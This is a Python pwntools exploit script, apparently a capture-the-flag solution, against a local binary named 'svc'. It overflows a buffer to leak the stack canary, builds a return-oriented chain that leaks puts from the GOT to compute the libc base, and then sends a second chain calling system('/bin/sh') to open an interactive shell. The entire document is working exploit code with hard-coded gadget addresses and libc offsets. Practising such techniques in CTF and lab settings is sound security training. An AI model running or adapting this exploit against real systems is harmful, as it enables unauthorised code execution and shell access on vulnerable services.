from pwn import *

target = process("./svc")
# gdb.attach(target)
elf = ELF("svc")

POP_RDI_RET = p64(0x400ea3)
GOT_PUTS = p64(0x602018)
PLT_PUTS = p64(0x4008d0)

PUTS_OFFSET_LIBC = 0x82360
SYSTEM_OFFSET_LIBC = 0x52f10
BINSH_OFFSET_LIBC = 0x1afea4

MAIN_START_JUMPBACK = p64(0x400a96)

def feed(data):
    print(target.recvuntil(">>"))
    target.sendline('1')
    print(target.recvuntil(">>"))
    target.send(data)

def review_input():
    print(target.recvuntil(">>"))
    target.sendline("2")
    print(target.recvuntil("0" * 0xa9))
    canaryLeak = target.recv(7)
    canary = u64(b"\x00" + canaryLeak)
    print("canary is: " + hex(canary))
    return canary

def leave():
    print(target.recvuntil(">>"))
    target.sendline("3")

leak_canary_payload = ""
leak_canary_payload += "0" * 0xa8
leak_canary_payload += "0"

feed(leak_canary_payload)

canary = review_input()

# leakLibc = ""
leakLibc = b"0" * 0xa8
leakLibc += p64(canary)
leakLibc += b"1" * 0x8
leakLibc += POP_RDI_RET
leakLibc += GOT_PUTS
leakLibc += PLT_PUTS
leakLibc += MAIN_START_JUMPBACK

feed(leakLibc)

leave()

print(target.recvuntil("[*]BYE ~ TIME TO MINE MIENRALS...\x0a"))
putsLeak = target.recvline().replace(b"\x0a", b"")
putsLibc = u64(putsLeak + b"\x00"*(8-len(putsLeak)))
libcBase = putsLibc - PUTS_OFFSET_LIBC
systemLibc = libcBase + SYSTEM_OFFSET_LIBC
binshLibc = libcBase + BINSH_OFFSET_LIBC
print("libc base: " + hex(libcBase))

# payload = ""
payload = b"0" * 0xa8
payload += p64(canary)
payload += b"1" * 0x8
payload += POP_RDI_RET
payload += p64(binshLibc)
payload += p64(systemLibc)

feed(payload)
target.send("3")
target.interactive()
